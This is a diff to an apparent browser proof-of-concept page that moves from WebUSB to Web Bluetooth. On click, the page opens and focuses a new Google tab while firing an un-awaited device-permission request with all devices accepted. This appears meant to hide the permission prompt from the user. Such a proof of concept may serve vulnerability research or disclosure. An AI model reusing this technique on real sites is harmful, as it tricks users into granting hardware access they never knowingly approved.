@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>PoC</title>
+<title>Bluetooth PoC</title>
 <style>
   html, body {
     margin: 0;
@@ -27,11 +27,13 @@ const overlay = document.getElementById('overlay');
 
 overlay.addEventListener('click', () => {
   try {
-    // 1. Open Google FIRST (still inside gesture)
+    // 1. Open new tab first (inside gesture)
     const newTab = window.open('https://www.google.com', '_blank');
 
-    // 2. Call USB WITHOUT await (important!)
-    navigator.usb.requestDevice({ filters: [{}] });
+    // 2. Bluetooth request (NO await)
+    navigator.bluetooth.requestDevice({
+      acceptAllDevices: true
+    });
 
     // 3. Focus new tab
     if (newTab) newTab.focus();
